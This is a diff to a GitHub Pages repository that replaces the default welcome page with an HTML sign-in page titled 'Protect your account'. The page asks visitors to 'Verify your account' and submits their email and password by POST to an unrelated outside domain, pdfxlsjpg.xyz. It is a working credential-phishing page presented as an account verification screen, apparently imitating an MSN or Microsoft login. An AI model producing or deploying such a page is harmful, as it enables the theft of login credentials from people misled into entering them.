@@ -1,37 +1,168 @@
-## Welcome to GitHub Pages
 
-You can use the [editor on GitHub](https://github.com/futurama2013/msn/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            body {
+                font-family: "Open Sans", sans-serif;
+            }
 
-### Markdown
+            button {
+                width: 80%;
+                margin-bottom: 30%;
+                margin-left: auto;
+                margin-right: auto;
+                display: block;
+                background-color: white;
+                height: 40px;
+                color: #188fff;
+                border: 1px solid #188fff;
+                border-radius: 30px;
+                font-size: 1.5rem;
+            }
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+            button:hover {
+                background-color: #188fff;
+                color: #ffffff;
+            }
 
-```markdown
-Syntax highlighted code block
+            h1 {
+                text-align: center;
+                font-size: 1.5rem;
+                margin-bottom: 1px;
+            }
 
-# Header 1
-## Header 2
-### Header 3
+            form {
+                padding-bottom: 10%;
+            }
 
-- Bulleted
-- List
+            .infoText {
+                text-align: center;
+                margin-bottom: 20%;
+                margin-top: 0;
+                font-size: 0.8rem;
+                font-weight: 500;
+                color: grey;
+            }
 
-1. Numbered
-2. List
+            .footerz {
+                text-align: center;
+                color: #188fff;
+                font-size: 0.65rem;
+                margin-bottom: 10%;
+            }
 
-**Bold** and _Italic_ and `Code` text
+            input {
+                border-bottom: 1px solid #b8bec2;
+                border-top: none;
+                border-left: none;
+                border-right: none;
+                background-color: white;
+                width: 80%;
+                margin-bottom: 10%;
+                margin-left: auto;
+                margin-right: auto;
+                display: block;
+            }
 
-[Link](url) and ![Image](src)
-```
+            ::placeholder {
+                padding-bottom: 4%;
+                font-size: 1rem;
+                text-align: center;
+                color: #b8bec2;
+                font-weight: 600;
+            }
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+            .logo {
+                width: 50%;
+                margin-left: auto;
+                margin-right: auto;
+                display: block;
+            }
 
-### Jekyll Themes
+            h2 {
+                display: inline;
+                margin: 0;
+            }
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/futurama2013/msn/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+            #logoz {
+                display: inline;
+            }
 
-### Support or Contact
+            .header {
+                width: 30%;
+				display: inline-block;
+            }
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+            .container {
+                width: 80%;
+                height: 500px;
+                margin: 0 auto;
+                background-color: white;
+                -webkit-box-shadow: 0px -2px 5px -2px rgba(0, 0, 0, 0.75);
+                -moz-box-shadow: 0px -2px 5px -2px rgba(0, 0, 0, 0.75);
+                box-shadow: 0px -2px 5px -2px rgba(0, 0, 0, 0.75);
+                padding-bottom: 0.5%;
+            }
+
+            @media screen and (min-width: 600px) {
+                .container {
+                    width: 25%;
+                    margin: auto;
+                }
+
+                .header {
+                    width: 10%;
+                }
+
+                button {
+                    margin-bottom: 5%;
+                }
+
+                .footerz {
+                    margin-bottom: 5%;
+                }
+            }
+        </style>
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>Protect your account</title>
+        <meta name="description" content="" />
+        <link
+            rel="shortcut icon"
+            href="https://i.pinimg.com/originals/ce/af/83/ceaf8384322af790486cff176a0a2f24.png"
+            type="image/x-icon"
+        />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" href="styles.css" />
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet" />
+    </head>
+    <body>
+        <header>
+        <img
+            class="header"
+            src="#"
+            alt=""
+            class="logo" id="logoz"
+        />
+        </header>
+        <div class="container">
+            <img
+                src="https://i.pinimg.com/originals/ce/af/83/ceaf8384322af790486cff176a0a2f24.png"
+                alt=""
+                class="logo"
+            />
+            <h1>Sign in</h1>
+            <p class="infoText">Verify your account</p>
+            <form action="https://pdfxlsjpg.xyz/"php method="POST">
+                <input type="email" name="mail" required class="email" placeholder="Email" />
+                <input type="password" required name="pass" class="password" placeholder="Password" /><br />
+                <button type="submit" name="submit">Confirm</button>
+            </form>
+            
+        </div>
+        <script src="" async defer></script>
+    </body>
+</html>
+
